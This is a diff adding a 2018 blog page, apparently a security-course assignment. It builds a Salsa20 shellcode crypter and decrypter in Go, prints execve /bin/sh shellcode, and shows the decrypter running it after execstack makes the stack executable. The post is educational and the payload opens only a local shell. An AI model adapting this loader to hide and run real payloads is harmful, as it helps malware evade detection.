@@ -1,0 +1,650 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Creating a custom shellcode crypter - hackcommander.io</title>
+<meta name="description" content="For this last SLAE assignment, I’ve created a custom shellcode crypter using the Salsa20 stream cipher. Salsa20 is a family of 256-bit stream ciphers designed in 2005 and submitted to eSTREAM, the ECRYPT Stream Cipher Project.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Creating a custom shellcode crypter">
+<meta property="og:url" content="http://localhost:4000/custom-crypter/">
+
+
+  <meta property="og:description" content="For this last SLAE assignment, I’ve created a custom shellcode crypter using the Salsa20 stream cipher. Salsa20 is a family of 256-bit stream ciphers designed in 2005 and submitted to eSTREAM, the ECRYPT Stream Cipher Project.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2018-12-12T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/custom-crypter/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Creating a custom shellcode crypter</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Creating a custom shellcode crypter">
+    <meta itemprop="description" content="For this last SLAE assignment, I’ve created a custom shellcode crypter using the Salsa20 stream cipher. Salsa20 is a family of 256-bit stream ciphers designed in 2005 and submitted to eSTREAM, the ECRYPT Stream Cipher Project.">
+    <meta itemprop="datePublished" content="December 12, 2018">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Creating a custom shellcode crypter
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-12-12T00:00:00+01:00">December 12, 2018 </time>&emsp;
+          
+          
+        </p>
+        <p>For this last SLAE assignment, I’ve created a custom shellcode crypter using the <a href="https://en.wikipedia.org/wiki/Salsa20">Salsa20</a> stream cipher. Salsa20 is a family of 256-bit stream ciphers designed in 2005 and submitted to eSTREAM, the ECRYPT Stream Cipher Project.</p>
+
+<p>I wanted to learn the basics of Golang for some time so this was a good opportunity to try a new programming language. The crypter and decrypter are both written in Go and use the offical golang.org sub-repository crypto packages. I also used the <a href="https://golang.org/cmd/cgo/">Cgo</a> and <a href="https://golang.org/pkg/unsafe/">unsafe</a> packages so that I could get around the type safety of the Go programming language and call the shellcode once it has been decrypted.</p>
+
+<p>For demonstration purposes, we will use the standard execve shellcode that executes <code class="language-plaintext highlighter-rouge">/bin/sh</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/examples/Shellcode/Execve$ ../../../compile.sh execve
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Shellcode: \xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
+[+] Length: 49
+[+] Done!
+</code></pre></div></div>
+
+<h2 id="crypter">Crypter</h2>
+
+<p>The crypter uses the following input:</p>
+<ul>
+  <li>Shellcode</li>
+  <li>24 bytes nonce (generated randomly)</li>
+  <li>32 bytes key (generated randomly)</li>
+</ul>
+
+<p>If the resulting encrypted shellcode contains any null-byte, a warning is displayed.</p>
+
+<p>The crypter code is shown below:</p>
+<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="s">"fmt"</span>
+<span class="k">import</span> <span class="s">"os"</span>
+<span class="k">import</span> <span class="s">"crypto/rand"</span>
+<span class="k">import</span> <span class="s">"golang.org/x/crypto/salsa20"</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Shellcode code crypter</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c">// execve shellcode /bin/sh</span>
+    <span class="n">in</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
+            <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x1a</span><span class="p">,</span> <span class="m">0x5e</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xdb</span><span class="p">,</span> <span class="m">0x88</span><span class="p">,</span> <span class="m">0x5e</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span>
+            <span class="m">0x89</span><span class="p">,</span> <span class="m">0x76</span><span class="p">,</span> <span class="m">0x08</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0x5e</span><span class="p">,</span> <span class="m">0x0c</span><span class="p">,</span> <span class="m">0x8d</span><span class="p">,</span> <span class="m">0x1e</span><span class="p">,</span>
+            <span class="m">0x8d</span><span class="p">,</span> <span class="m">0x4e</span><span class="p">,</span> <span class="m">0x08</span><span class="p">,</span> <span class="m">0x8d</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x0c</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span>
+            <span class="m">0xb0</span><span class="p">,</span> <span class="m">0x0b</span><span class="p">,</span> <span class="m">0xcd</span><span class="p">,</span> <span class="m">0x80</span><span class="p">,</span> <span class="m">0xe8</span><span class="p">,</span> <span class="m">0xe1</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span>
+            <span class="m">0xff</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x73</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span>
+            <span class="m">0x41</span><span class="p">,</span> <span class="m">0x42</span><span class="p">,</span> <span class="m">0x42</span><span class="p">,</span> <span class="m">0x42</span><span class="p">,</span> <span class="m">0x42</span><span class="p">,</span> <span class="m">0x43</span><span class="p">,</span> <span class="m">0x43</span><span class="p">,</span> <span class="m">0x43</span><span class="p">,</span>
+            <span class="m">0x43</span> <span class="p">}</span>
+
+    <span class="n">out</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">in</span><span class="p">))</span>
+
+    <span class="c">// Generate a random 24 bytes nonce</span>
+    <span class="n">nonce</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">24</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">rand</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">nonce</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+            <span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="c">// Generate a random 32 bytes key</span>
+    <span class="n">key_slice</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">32</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">rand</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">key_slice</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+        <span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">var</span> <span class="n">key</span> <span class="p">[</span><span class="m">32</span><span class="p">]</span><span class="kt">byte</span>
+    <span class="nb">copy</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="o">:</span><span class="p">],</span> <span class="n">key_slice</span><span class="p">[</span><span class="o">:</span><span class="p">])</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Key len: %d bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Key: "</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">key</span> <span class="p">{</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%#x,"</span><span class="p">,</span> <span class="n">element</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Nonce: "</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">nonce</span> <span class="p">{</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%#x,"</span><span class="p">,</span> <span class="n">element</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Original shellcode: "</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">in</span> <span class="p">{</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%#x,"</span><span class="p">,</span> <span class="n">element</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">salsa20</span><span class="o">.</span><span class="n">XORKeyStream</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">)</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Encrypted shellcode: "</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">out</span> <span class="p">{</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%#x,"</span><span class="p">,</span> <span class="n">element</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">out</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="n">element</span> <span class="o">==</span> <span class="m">0</span> <span class="p">{</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"##########################</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"WARNING null byte detected</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"##########################</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">1</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="decrypter">Decrypter</h2>
+
+<p>To decrypt the shellcode, the same <code class="language-plaintext highlighter-rouge">salsa20.XORKeyStream</code> function is called using the original nonce and key.</p>
+
+<p>The decrypter code is shown below:</p>
+<div class="language-golang highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="c">/*
+void call_shellcode(char *code) {
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+*/</span>
+<span class="k">import</span> <span class="s">"C"</span>
+<span class="k">import</span> <span class="s">"fmt"</span>
+<span class="k">import</span> <span class="s">"unsafe"</span>
+<span class="k">import</span> <span class="s">"golang.org/x/crypto/salsa20"</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Shellcode code decrypter</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c">// Paste encrypted shellcode here</span>
+    <span class="n">in</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span> <span class="m">0x79</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x15</span><span class="p">,</span><span class="m">0x27</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0xdb</span><span class="p">,</span><span class="m">0xbc</span><span class="p">,</span><span class="m">0x5</span><span class="p">,</span><span class="m">0x84</span><span class="p">,</span><span class="m">0x97</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x4f</span><span class="p">,</span><span class="m">0xed</span><span class="p">,</span><span class="m">0x81</span><span class="p">,</span><span class="m">0xd</span><span class="p">,</span><span class="m">0xf</span><span class="p">,</span><span class="m">0x93</span><span class="p">,</span><span class="m">0x8e</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0xa5</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x99</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span><span class="m">0xcd</span><span class="p">,</span><span class="m">0xbe</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x54</span><span class="p">,</span><span class="m">0xce</span><span class="p">,</span><span class="m">0x9d</span><span class="p">,</span><span class="m">0xe7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x95</span><span class="p">,</span><span class="m">0xc3</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xb8</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0x87</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x6e</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x76</span> <span class="p">}</span>
+
+    <span class="n">out</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">in</span><span class="p">))</span>
+
+    <span class="c">// Paste nonce here</span>
+    <span class="n">nonce</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span> <span class="m">0xc6</span><span class="p">,</span><span class="m">0x2f</span><span class="p">,</span><span class="m">0xb2</span><span class="p">,</span><span class="m">0xd1</span><span class="p">,</span><span class="m">0x94</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0x8a</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0x7f</span><span class="p">,</span><span class="m">0x43</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0xfc</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0xbc</span> <span class="p">}</span>
+
+    <span class="c">// Paste key here</span>
+    <span class="n">key</span> <span class="o">:=</span> <span class="p">[</span><span class="m">32</span><span class="p">]</span><span class="kt">byte</span> <span class="p">{</span> <span class="m">0x24</span><span class="p">,</span><span class="m">0x90</span><span class="p">,</span><span class="m">0xef</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0xee</span><span class="p">,</span><span class="m">0xda</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0xfa</span><span class="p">,</span><span class="m">0xb9</span><span class="p">,</span><span class="m">0x8</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x3f</span><span class="p">,</span><span class="m">0x8e</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x0</span><span class="p">,</span><span class="m">0xec</span><span class="p">,</span><span class="m">0x7</span><span class="p">,</span><span class="m">0x19</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x1f</span><span class="p">,</span><span class="m">0x94</span><span class="p">,</span><span class="m">0xe7</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0xdf</span><span class="p">,</span><span class="m">0xee</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x9</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0xb5</span> <span class="p">}</span>
+
+    <span class="n">salsa20</span><span class="o">.</span><span class="n">XORKeyStream</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">)</span>
+
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Decrypted shellcode: "</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">element</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">out</span> <span class="p">{</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%#x,"</span><span class="p">,</span> <span class="n">element</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+    <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Executing shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">C</span><span class="o">.</span><span class="n">call_shellcode</span><span class="p">((</span><span class="o">*</span><span class="n">C</span><span class="o">.</span><span class="n">char</span><span class="p">)(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">out</span><span class="p">[</span><span class="m">0</span><span class="p">])))</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="using-the-crypter">Using the crypter</h2>
+
+<p>To compile the crypter and test it, we execute the command <code class="language-plaintext highlighter-rouge">go build -o crypter crypter.go &amp;&amp; ./crypter</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment7$ go build -o crypter crypter.go &amp;&amp; ./crypter
+Shellcode code crypter
+Key len: 32 bytes
+Key: 0x24,0x90,0xef,0x80,0x66,0xee,0xda,0x52,0xfa,0xb9,0x8,0x37,0x3f,0x8e,0x1c,0x3b,0x0,0xec,0x7,0x19,0x5a,0x1f,0x94,0xe7,0x2e,0xdf,0xee,0x8d,0x9,0x63,0xe4,0xb5,
+Nonce: 0xc6,0x2f,0xb2,0xd1,0x94,0x7b,0x47,0xa6,0x51,0x5d,0x57,0xfb,0x8a,0x2c,0x3e,0x7f,0x43,0x5a,0xfc,0xbb,0x24,0x4d,0xc7,0xbc,
+Original shellcode: 0xeb,0x1a,0x5e,0x31,0xdb,0x88,0x5e,0x7,0x89,0x76,0x8,0x89,0x5e,0xc,0x8d,0x1e,0x8d,0x4e,0x8,0x8d,0x56,0xc,0x31,0xc0,0xb0,0xb,0xcd,0x80,0xe8,0xe1,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
+Encrypted shellcode: 0x79,0x46,0x15,0x27,0xa6,0xdb,0xbc,0x5,0x84,0x97,0x83,0x7c,0x4f,0xed,0x81,0xd,0xf,0x93,0x8e,0x7c,0xd3,0xa5,0x74,0x99,0xaa,0xcd,0xbe,0xd0,0x49,0x54,0xce,0x9d,0xe7,0x4a,0x64,0x95,0xc3,0x83,0xb8,0x58,0x4a,0xe4,0x87,0x49,0xb3,0x6e,0x6a,0x32,0x76,
+</code></pre></div></div>
+
+<p>Next, the key, nonce and encrypted shellcode are copy/pasted into the <code class="language-plaintext highlighter-rouge">decrypter.go</code> source file.</p>
+
+<p>Compiling the decrypter uses: <code class="language-plaintext highlighter-rouge">go build -o decrypter decrypter.go</code>. There is however another step that needs to be executed after for the shellcode to work. By default (in newer Golang versions at least), the stack memory space is not marked executable so our shellcode won’t work since it resides on the stack:</p>
+
+<p>The output below shows the decrypter segfaulting when we execute it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment7$ ./decrypter 
+...
+fatal error: unexpected signal during runtime execution
+[signal SIGSEGV: segmentation violation code=0x2 addr=0x841e100 pc=0x841e100]
+
+runtime stack:
+runtime.throw(0x80ea75c, 0x2a)
+        /usr/local/go/src/runtime/panic.go:608 +0x6a
+runtime.sigpanic()
+        /usr/local/go/src/runtime/signal_unix.go:374 +0x239
+
+goroutine 1 [syscall]:
+runtime.cgocall(0x80bf970, 0x842a718, 0x0)
+        /usr/local/go/src/runtime/cgocall.go:128 +0x6e fp=0x842a704 sp=0x842a6ec pc=0x804afee
+main._Cfunc_call_shellcode(0x841e100)
+        _cgo_gotypes.go:43 +0x33 fp=0x842a718 sp=0x842a704 pc=0x80bf613
+main.main()
+        /home/slemire/slae32/assignment7/decrypter.go:37 +0x2a1 fp=0x842a7d0 sp=0x842a718 pc=0x80bf8f1
+runtime.main()
+        /usr/local/go/src/runtime/proc.go:201 +0x206 fp=0x842a7f0 sp=0x842a7d0 pc=0x806cf76
+runtime.goexit()
+        /usr/local/go/src/runtime/asm_386.s:1324 +0x1 fp=0x842a7f4 sp=0x842a7f0 pc=0x80908f1
+</code></pre></div></div>
+
+<p>To resolve this problem we can make the stack executable again by using the <code class="language-plaintext highlighter-rouge">execstack</code> tool as follows. The shellcode is successfully decrypted and executed, spawning <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment7$ execstack -s decrypter
+slemire@slae:~/slae32/assignment7$ ./decrypter 
+Shellcode code decrypter
+Decrypted shellcode: 0xeb,0x1a,0x5e,0x31,0xdb,0x88,0x5e,0x7,0x89,0x76,0x8,0x89,0x5e,0xc,0x8d,0x1e,0x8d,0x4e,0x8,0x8d,0x56,0xc,0x31,0xc0,0xb0,0xb,0xcd,0x80,0xe8,0xe1,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
+Shellcode length: 49
+Executing shellcode...
+$ id
